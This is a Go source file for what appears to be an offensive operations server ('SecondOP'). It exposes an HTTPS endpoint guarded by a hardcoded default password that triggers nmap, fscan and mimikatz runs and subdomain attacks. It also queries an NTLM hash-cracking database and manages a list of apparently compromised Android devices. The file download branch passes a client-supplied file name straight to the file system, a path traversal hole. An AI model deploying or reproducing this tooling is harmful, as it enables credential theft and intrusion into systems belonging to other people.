package main

import (
	"database/sql"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/UD94/SecondOP/Common"
	"github.com/UD94/SecondOP/Function"
)

var channel_password string
var ntlmdb *sql.DB
var linedb *sql.DB

type AutoGenerated struct {
	Password string   `json:"Password"`
	Doldfile bool     `json:"Doldfile"`
	Action   string   `json:"Action"`
	Type     string   `json:"type"`
	Content  []string `json:"Content"`
}

type ResponseJson struct {
	Code    int      `json:"code"`
	Content []string `json:"Content"`
}

func HandlePostJson(w http.ResponseWriter, r *http.Request) {
	// 根据请求body创建一个json解析器实例
	var get_result AutoGenerated
	var ResponseString ResponseJson
	data, err := ioutil.ReadAll(r.Body)

	json.Unmarshal(data, &get_result)
	if err != nil {
		return
	}

	if get_result.Password != channel_password {
		ResponseString.Code = 5
		ResponseString.Content = append(ResponseString.Content, "access denied")

	} else {
		switch get_result.Action {
		case "dnsresolvr":
			go Function.Dns_thread(get_result.Content[0])

			go Function.Google_domain(get_result.Content[0])
			ResponseString.Code = 0
		case "config":
			_, err := Config_Workstation(get_result.Type, get_result.Content, get_result.Doldfile)
			if err != nil {
				ResponseString.Code = 11
				ResponseString.Content = append(ResponseString.Content, "config failed")
			} else {

				ResponseString.Code = 0
				ResponseString.Content = append(ResponseString.Content, "success")
			}

		case "md5":
			result, err := Function.Md5_query(ntlmdb, get_result.Content[0])
			if err != nil {
				switch result {
				case "nopass":

					ResponseString.Code = 7
					ResponseString.Content = append(ResponseString.Content, "not found")
				case "nodatabse":

					ResponseString.Code = 8
					ResponseString.Content = append(ResponseString.Content, "database not ready")
				}
			} else {
				ResponseString.Code = 0
				ResponseString.Content = append(ResponseString.Content, result)
			}

		case "analysis":
			switch get_result.Type {
			case "nmap":
				Function.Nmap()
			case "fscan":
				Function.Fscan()
			case "mimikatz":
				Function.Mimikatz(get_result.Content)
			}
		case "subhack":
			Function.Subhackdomain()

		case "query":
			switch get_result.Type {
			case "androidlist":
				ResponseString.Content, _ = Function.Linelist(linedb)
				ResponseString.Code = 0
			case "joblist":
				file, _ := os.Open("Cache\\" + get_result.Content[0])
				defer file.Close()

				fileHeader := make([]byte, 512)
				file.Read(fileHeader)

				fileStat, _ := file.Stat()

				w.Header().Set("Content-Disposition", "attachment; filename="+get_result.Content[0])
				w.Header().Set("Content-Type", http.DetectContentType(fileHeader))
				w.Header().Set("Content-Length", strconv.FormatInt(fileStat.Size(), 10))

				file.Seek(0, 0)
				io.Copy(w, file)
				ResponseString.Code = 0
			}

		case "line":

			Function.Linequery(linedb, w, get_result.Content[0], get_result.Content[1], get_result.Content[2])

		default:

			files, err := ioutil.ReadDir(`Cache`)
			if err != nil {
				panic(err)
			}
			ResponseString.Code = 0
			for _, v := range files {
				ResponseString.Content = append(ResponseString.Content, v.Name())
			}

		}

	}
	response, _ := json.Marshal(ResponseString)
	fmt.Fprint(w, string(response))

}

func Config_Workstation(configtype string, content []string, Doldfile bool) (string, error) {

	switch configtype {
	case "dnsdomainconfig":
		if Doldfile {
			Common.DeleteFile("domain.txt")
		}
		for _, s := range content {
			Common.Write_result(s+"\n", "domain.txt")
		}
	case "androidonline":

		_, err := Function.Lineinsert(linedb, content[0], content[1], content[2], content[3])
		if err != nil {
			return "insert android error", errors.New("onlineconfigerror")
		}

	case "md5config":
		_, err := Function.MD5_insert(ntlmdb, content[0], content[1])
		if err != nil {
			return "insert md5 error", errors.New("md5configerror")
		}
		/*
			case "server":
				cfg.Section("mysql").Key("ip").SetValue(content[0])
				cfg.Section("mysql").Key("port").SetValue(content[1])
				cfg.Section("mysql").Key("user").SetValue(content[2])
				cfg.Section("mysql").Key("password").SetValue(content[3])
		*/

	case "communicationconfig":
		channel_password = content[0]
	default:
		return "noconfig", errors.New("not config")
	}
	return "success", nil
}

func Starthttps(ip string) {
	http.HandleFunc("/post", HandlePostJson)

	err := http.ListenAndServeTLS(ip+":443", "cert.pem", "privkey.pem", nil)
	if err != nil {
		log.Fatal("listen error:", err.Error())
	}
}

func main() {

	var ip string
	flag.StringVar(&channel_password, "p", "ud94iscreater", "连接密码,默认为ud94iscreater")
	flag.StringVar(&ip, "i", "0.0.0.0", "监听ip,默认为0.0.0.0")
	flag.Parse()
	ntlmdb, _ = Common.InitDB("ntlm")
	linedb, _ = Common.InitDB("androids")
	Starthttps(ip)

}
